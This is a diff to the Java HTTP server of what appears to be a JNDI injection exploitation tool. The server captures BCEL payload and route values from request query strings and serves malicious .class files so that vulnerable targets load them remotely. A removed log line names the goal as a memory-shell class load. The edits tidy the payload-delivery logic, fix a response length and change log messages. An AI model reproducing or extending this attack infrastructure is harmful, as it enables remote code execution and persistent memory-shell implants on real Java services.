@@ -20,6 +20,7 @@ import java.io.FileInputStream;
 import java.io.IOException;
 import java.net.InetSocketAddress;
 import java.nio.charset.StandardCharsets;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 import java.util.jar.JarOutputStream;
@@ -41,6 +42,8 @@ public class HTTPServer {
                     System.out.println(ansi().render("@|green [+]|@ New HTTP Request From >>" + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI()));
 
                     String qi = String.valueOf(httpExchange.getRequestURI());
+
+
                     if (qi.contains("setPathAlias")) {
                         Config.BCEL1 = qi.substring(qi.indexOf("=") + 1);
                         System.out.println(ansi().render("@|green [+]|@ 获取参数成功 >> " + Config.BCEL1));
@@ -48,6 +51,7 @@ public class HTTPServer {
                         Config.ROUTE = qi.substring(qi.indexOf("=") + 1);
                         System.out.println(ansi().render("@|green [+]|@ 获取路由成功 >> " + Config.ROUTE));
                     }
+
                     String path = httpExchange.getRequestURI().getPath();
                     if (path.endsWith(".class")) {
                         handleClassRequest(httpExchange);
@@ -435,16 +439,13 @@ public class HTTPServer {
         String path      = exchange.getRequestURI().getPath();
         String className = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
         System.out.println(ansi().render("@|green [+] Receive ClassRequest: |@" + className + ".class"));
-
         if (Cache.contains(className)) {
             System.out.println(ansi().render("@|green [+] Response Code: |@" + 200));
 
             byte[] bytes = Cache.get(className);
             exchange.sendResponseHeaders(200, bytes.length);
-            //这一步返回http请求
             exchange.getResponseBody().write(bytes);
-        } else {//找不到就从/org目录下照
-            //String pa   = cwd + File.separator + "org";
+        } else {
             String pa   = cwd + path;
             File   file = new File(pa);
 
@@ -454,9 +455,11 @@ public class HTTPServer {
                     fileInputStream.read(bytes);
                 }
                 exchange.getResponseHeaders().set("Content-type", "application/octet-stream");
-                exchange.sendResponseHeaders(200, file.length() + 1);
+                exchange.sendResponseHeaders(200, file.length());
                 exchange.getResponseBody().write(bytes);
-                System.out.println(ansi().render("@|green [+] 内存马远程类加载成功 |@" + 200));
+
+                System.out.println(ansi().render("@|green [+] 远程类加载成功 |@" + 200));
+                System.out.println("-------------------------------------- JNDI Remote Refenrence Links --------------------------------------");
             } else {
                 System.out.println(ansi().render("@|red [!] Response Code: |@" + 404));
                 exchange.sendResponseHeaders(404, 0);
